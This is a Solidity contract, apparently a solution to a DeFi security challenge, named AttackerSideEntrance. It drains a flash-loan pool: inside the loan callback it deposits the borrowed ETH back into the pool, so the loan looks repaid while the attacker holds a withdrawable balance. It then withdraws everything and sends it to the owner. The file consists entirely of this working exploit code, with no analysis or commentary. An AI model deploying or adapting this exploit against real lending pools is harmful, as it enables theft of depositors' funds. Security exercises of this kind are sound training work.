//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
import "solady/src/utils/SafeTransferLib.sol";

interface ISideEnterance{
   function flashLoan(uint256 amount) external ;
   function deposit() external payable;
   function withdraw() external;
}

contract AttackerSideEntrance {
    address immutable  owner;
    address immutable pool;
    constructor (address _to) {
        owner = msg.sender;   
        pool = _to;
    }
    function attack(uint256 amount) external {
        ISideEnterance(pool).flashLoan(amount);
        ISideEnterance(pool).withdraw();
        SafeTransferLib.safeTransferETH(owner, address(this).balance);
    }
    function execute() external payable{
        ISideEnterance(pool).deposit{value: address(this).balance}();
    }
    // fallback() external payable { }
    receive() external payable {}

}